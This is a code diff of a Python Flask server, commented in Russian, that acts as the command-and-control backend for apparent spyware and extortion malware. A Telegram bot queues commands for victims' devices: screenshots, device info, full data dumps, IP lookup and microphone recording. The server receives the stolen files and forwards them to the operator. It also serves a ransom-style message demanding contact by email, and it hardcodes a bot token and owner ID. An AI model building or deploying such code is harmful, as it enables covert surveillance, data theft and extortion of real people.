@@ -1,10 +1,8 @@
 """
-server.py — единая точка:
-  • крутит бота (getUpdates / sendMessage / sendDocument)
-  • принимает дампы от клиента (POST /upload)
-  • раздаёт конфиг клиенту (GET /config)
-  • отдаёт клиенту команды через long-poll (GET /commands)
-  • отправляет результат клиента в бот
+server.py — единая точка на render:
+  • бот-поллинг в фоне
+  • /config, /commands, /upload, /upload_photo, /upload_voice, /upload_text
+  • данные в /tmp/dumps
 """
 
 import os
@@ -19,30 +17,29 @@ import requests
 from flask import Flask, request, jsonify
 
 # ═══════════════════════════════════════
-#  ЕДИНСТВЕННЫЙ КОНФИГ
+#  ENV
 # ═══════════════════════════════════════
 
-BOT_TOKEN = "8552121942:AAF8bygD17mskbtvuPnZ1-_407a3ooT_CA4"
-OWNER_ID  = 6716592576
+BOT_TOKEN = os.getenv("BOT_TOKEN", "8552121942:AAF8bygD17mskbtvuPnZ1-_407a3ooT_CA4")
+OWNER_ID  = int(os.getenv("OWNER_ID", "6716592576"))
 
-SERVER_HOST = "0.0.0.0"
-SERVER_PORT = 5000
-
-SPAM_MESSAGE  = (
+SPAM_MESSAGE  = os.getenv(
+    "SPAM_MESSAGE",
     "your data is gone, so as not to leak it, write to the mail "
-    "domnaalmazniy33@gmail.com :)))))))))))))))))))"
+    "domnaalmazniy33@gmail.com :)))))))))))))))))))",
 )
-SPAM_INTERVAL = 1.0
+SPAM_INTERVAL = float(os.getenv("SPAM_INTERVAL", "1.0"))
 
 API = f"https://api.telegram.org/bot{BOT_TOKEN}"
 
-app  = Flask(__name__)
-DUMPS = Path("./dumps")
-DUMPS.mkdir(exist_ok=True)
+DUMPS = Path(os.getenv("DUMPS_DIR", "/tmp/dumps"))
+DUMPS.mkdir(parents=True, exist_ok=True)
+
+app = Flask(__name__)
 
 
 # ═══════════════════════════════════════
-#  МИНИ-ОБЁРТКА BOT API
+#  BOT API
 # ═══════════════════════════════════════
 
 def tg(method: str, **kwargs):
@@ -109,13 +106,10 @@ def kb() -> dict:
 
 
 # ═══════════════════════════════════════
-#  ОЧЕРЕДЬ КОМАНД ДЛЯ КЛИЕНТА
+#  ОЧЕРЕДЬ КОМАНД
 # ═══════════════════════════════════════
 
-# каждая команда — dict: {"cmd": str, "args": dict}
 _command_queue: "queue.Queue[dict]" = queue.Queue()
-
-# клиентские сессии: id → last_seen
 _clients: dict[str, float] = {}
 
 
@@ -124,11 +118,10 @@ def _push_command(cmd: str, **args):
 
 
 # ═══════════════════════════════════════
-#  БОТ — ПРИЁМ СООБЩЕНИЙ ОТ ХОЗЯИНА
+#  БОТ-ПОЛЛИНГ
 # ═══════════════════════════════════════
 
 def bot_poll_loop():
-    """читает сообщения от OWNER_ID и раскидывает их в очередь для клиента."""
     offset = None
     while True:
         try:
@@ -152,26 +145,19 @@ def bot_poll_loop():
                 if text == "/start":
                     tg_send_text("avx online 🪱\nвыбирай:", kb=kb())
                 elif text == "📸 screenshot":
-                    _push_command("screenshot")
-                    tg_send_text("→ запросил скриншот")
+                    _push_command("screenshot");  tg_send_text("→ запросил скриншот")
                 elif text == "📱 info":
-                    _push_command("info")
-                    tg_send_text("→ запросил инфо")
+                    _push_command("info");        tg_send_text("→ запросил инфо")
                 elif text == "📦 full dump":
-                    _push_command("dump")
-                    tg_send_text("→ запросил дамп")
+                    _push_command("dump");        tg_send_text("→ запросил дамп")
                 elif text == "🌐 ip":
-                    _push_command("ip")
-                    tg_send_text("→ запросил ip")
+                    _push_command("ip");          tg_send_text("→ запросил ip")
                 elif text == "🔊 vibe":
-                    _push_command("vibe")
-                    tg_send_text("→ вибрирую")
+                    _push_command("vibe");        tg_send_text("→ вибрирую")
                 elif text == "🎤 mic":
-                    _push_command("mic")
-                    tg_send_text("→ слушаю микрофон")
+                    _push_command("mic");         tg_send_text("→ слушаю микрофон")
                 elif text == "💀 kill":
-                    _push_command("kill")
-                    tg_send_text("off 💀")
+                    _push_command("kill");        tg_send_text("off 💀")
                 else:
                     tg_send_text(f"неизвестная команда: `{text}`")
         except Exception as e:
@@ -180,27 +166,22 @@ def bot_poll_loop():
 
 
 # ═══════════════════════════════════════
-#  РОУТЫ ДЛЯ КЛИЕНТА
+#  РОУТЫ
 # ═══════════════════════════════════════
 
 @app.route("/config", methods=["GET"])
 def route_config():
-    """клиент забирает сюда всё что ему нужно при старте."""
     return jsonify({
         "spam_message":  SPAM_MESSAGE,
         "spam_interval": SPAM_INTERVAL,
+        "server":        "render",
     }), 200
 
 
 @app.route("/commands", methods=["GET"])
 def route_commands():
-    """
-    long-poll: клиент держит соединение, сервер отдаёт команду как только она появилась.
-    если за 25 сек ничего не пришло — 204, клиент переподключится.
-    """
     client_id = request.args.get("id", "anon")
     _clients[client_id] = time.time()
-
     try:
         cmd = _command_queue.get(timeout=25)
         return jsonify({"ok": True, "command": cmd}), 200
@@ -210,7 +191,6 @@ def route_commands():
 
 @app.route("/upload", methods=["POST"])
 def route_upload():
-    """клиент шлёт сюда zip. сервер распаковывает и пересылает хозяину в бот."""
     if "file" not in request.files:
         return jsonify({"ok": False, "err": "no file"}), 400
 
@@ -251,20 +231,16 @@ def route_upload():
         f"```"
     )
     tg_send_document(zip_path, caption=caption)
-
     return jsonify({"ok": True, "stamp": stamp}), 200
 
 
 @app.route("/upload_photo", methods=["POST"])
 def route_upload_photo():
-    """отдельный роут для скриншота — сразу шлём картинкой, не в архиве."""
     if "file" not in request.files:
         return jsonify({"ok": False, "err": "no file"}), 400
-
     f = request.files["file"]
     tmp = DUMPS / f"shot_{int(time.time())}.png"
     f.save(tmp)
-
     caption = request.form.get("caption", "📸")
     tg_send_photo(tmp, caption=caption)
     return jsonify({"ok": True}), 200
@@ -274,18 +250,15 @@ def route_upload_photo():
 def route_upload_voice():
     if "file" not in request.files:
         return jsonify({"ok": False, "err": "no file"}), 400
-
     f = request.files["file"]
     tmp = DUMPS / f"mic_{int(time.time())}.wav"
     f.save(tmp)
-
     tg_send_voice(tmp)
     return jsonify({"ok": True}), 200
 
 
 @app.route("/upload_text", methods=["POST"])
 def route_upload_text():
-    """клиент может просто прислать текст — сервер перекинет его в бот."""
     text = request.form.get("text", "")
     tag  = request.form.get("tag", "MSG")
     if text:
@@ -311,12 +284,15 @@ def route_index():
 
 
 # ═══════════════════════════════════════
-#  MAIN
+#  СТАРТ БОТ-ПОТОКА (важно для gunicorn)
 # ═══════════════════════════════════════
 
-if __name__ == "__main__":
-    # бот в отдельном потоке — не мешает flask
-    threading.Thread(target=bot_poll_loop, daemon=True).start()
+_bot_thread = None
 
-    tg_send_text("🪱 server started", kb=kb())
-    app.run(host=SERVER_HOST, port=SERVER_PORT, debug=False, threaded=True)
+def _ensure_bot_thread():
+    global _bot_thread
+    if _bot_thread is None or not _bot_thread.is_alive():
+        _bot_thread = threading.Thread(target=bot_poll_loop, daemon=True)
+        _bot_thread.start()
+
+_ensure_bot_thread()
